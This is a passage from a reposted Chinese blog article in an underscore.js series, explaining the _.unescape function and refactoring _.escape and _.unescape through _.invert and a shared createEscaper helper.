_.unescape = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">string</span>) </span>{
    <span class="hljs-keyword">var</span> escaper = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">match</span>) </span>{
        <span class="hljs-keyword">return</span> unescapeMap[match];
    };
    <span class="hljs-comment">// 使用非捕获性分组</span>
    <span class="hljs-keyword">var</span> source = <span class="hljs-string">'(?:'</span> + <span class="hljs-built_in">Object</span>.keys(unescapeMap).join(<span class="hljs-string">'|'</span>) + <span class="hljs-string">')'</span>;
    <span class="hljs-built_in">console</span>.log(source) <span class="hljs-comment">// (?:&amp;|&lt;|&gt;|"|'|`)</span>
    <span class="hljs-keyword">var</span> testRegexp = <span class="hljs-built_in">RegExp</span>(source);
    <span class="hljs-keyword">var</span> replaceRegexp = <span class="hljs-built_in">RegExp</span>(source, <span class="hljs-string">'g'</span>);

    string = string == <span class="hljs-literal">null</span> ? <span class="hljs-string">''</span> : <span class="hljs-string">''</span> + string;
    <span class="hljs-keyword">return</span> testRegexp.test(string) ? string.replace(replaceRegexp, escaper) : string;
}

<span class="hljs-built_in">console</span>.log(_.unescape(<span class="hljs-string">'Curly, Larry &amp;amp; Moe'</span>)) <span class="hljs-comment">// Curly, Larry &amp; Moe</span></code></pre>
<h2 id="articleHeader8">抽象</h2>
<p>你会不会觉得 <code>_.escape</code> 与 <code>_.unescape</code> 的代码实在是太像了，以至于让人感觉很冗余呢？</p>
<p>那么我们又该如何优化呢？</p>
<p>我们可以先写一个 <code>_.invert</code> 函数，将 escapeMap 传入的时候，可以得到 unescapeMap，然后我们再根据传入的 map (escapeMap 或者 unescapeMap) 不同，返回不同的函数。</p>
<p>实现的方式很简单，直接看代码：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="/**
 * 返回一个object副本，使其键（keys）和值（values）对换。
 * _.invert({a: &quot;b&quot;});
 * => {b: &quot;a&quot;};
 */
_.invert = function(obj) {
    var result = {};
    var keys = Object.keys(obj);
    for (var i = 0, length = keys.length; i < length; i++) {
        result[obj[keys[i]]] = keys[i];
    }
    return result;
};

var escapeMap = {
    '&amp;': '&amp;amp;',
    '<': '&amp;lt;',
    '>': '&amp;gt;',
    '&quot;': '&amp;quot;',
    &quot;'&quot;: '&amp;#x27;',
    '`': '&amp;#x60;'
};
var unescapeMap = _.invert(escapeMap);

var createEscaper = function(map) {
    var escaper = function(match) {
        return map[match];
    };
    // 使用非捕获性分组
    var source = '(?:' + _.keys(map).join('|') + ')';
    var testRegexp = RegExp(source);
    var replaceRegexp = RegExp(source, 'g');
    return function(string) {
        string = string == null ? '' : '' + string;
        return testRegexp.test(string) ? string.replace(replaceRegexp, escaper) : string;
    };
};

_.escape = createEscaper(escapeMap);
_.unescape = createEscaper(unescapeMap);" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="javascript hljs"><code class="js"><span class="hljs-comment">/**
 * 返回一个object副本，使其键（keys）和值（values）对换。
 * _.invert({a: "b"});
 * =&gt; {b: "a"};
 */</span>
_.invert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">obj</span>) </span>{
    <span class="hljs-keyword">var</span> result = {};
    <span class="hljs-keyword">var</span> keys = <span class="hljs-built_in">Object</span>.keys(obj);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>, length = keys.length; i &lt; length; i++) {
        result[obj[keys[i]]] = keys[i];
    }
    <span class="hljs-keyword">return</span> result;
};

<span class="hljs-keyword">var</span> escapeMap = {
    <span class="hljs-string">'&amp;'</span>: <span class="hljs-string">'&amp;amp;'</span>,
    <span class="hljs-string">'&lt;'</span>: <span class="hljs-string">'&amp;lt;'</span>,
    <span class="hljs-string">'&gt;'</span>: <span class="hljs-string">'&amp;gt;'</span>,
    <span class="hljs-string">'"'</span>: <span class="hljs-string">'&amp;quot;'</span>,
    <span class="hljs-string">"'"</span>: <span class="hljs-string">'&amp;#x27;'</span>,
    <span class="hljs-string">'`'</span>: <span class="hljs-string">'&amp;#x60;'</span>
};
<span class="hljs-keyword">var</span> unescapeMap = _.invert(escapeMap);

<span class="hljs-keyword">var</span> createEscaper = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">map</span>) </span>{
    <span class="hljs-keyword">var</span> escaper = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">match</span>) </span>{
        <span class="hljs-keyword">return</span> map[match];
    };
    <span class="hljs-comment">// 使用非捕获性分组</span>
    <span class="hljs-keyword">var</span> source = <span class="hljs-string">'(?:'</span> + _.keys(map).join(<span class="hljs-string">'|'</span>) + <span class="hljs-string">')'</span>;
    <span class="hljs-keyword">var</span> testRegexp = <span class="hljs-built_in">RegExp</span>(source);
    <span class="hljs-keyword">var</span> replaceRegexp = <span class="hljs-built_in">RegExp</span>(source, <span class="hljs-string">'g'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">string</span>) </span>{
        string = string == <span class="hljs-literal">null</span> ? <span class="hljs-string">''</span> : <span class="hljs-string">''</span> + string;
        <span class="hljs-keyword">return</span> testRegexp.test(string) ? string.replace(replaceRegexp, escaper) : string;
    };
};

_.escape = createEscaper(escapeMap);
_.unescape = createEscaper(unescapeMap);</code></pre>
<h2 id="articleHeader9">underscore 系列</h2>
<p>underscore 系列目录地址：<a href="https://github.com/mqyqingfeng/Blog" rel="nofollow noreferrer" target="_blank">https://github.com/mqyqingfeng/Blog</a>。</p>
<p>underscore 系列预计写八篇左右，重点介绍 underscore 中的代码架构、链式调用、内部函数、模板引擎等内容，旨在帮助大家阅读源码，以及写出自己的 undercore。</p>
<p>如果有错误或者不严谨的地方，请务必给予指正，十分感谢。如果喜欢或者有所启发，欢迎 star，对作者也是一种鼓励。</p>

                
{{< /raw >}}

# 版权声明
本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有，

本文仅用于学习、研究和交流目的。转载请注明出处、完整链接以及原作者。

原作者若认为本站侵犯了您的版权，请联系我们，我们会立即删除！

## 原文标题
underscore 系列之字符实体与 _.escape

## 原文链接
[https://segmentfault.com/a/1190000014056591](https://segmentfault.com/a/1190000014056591)

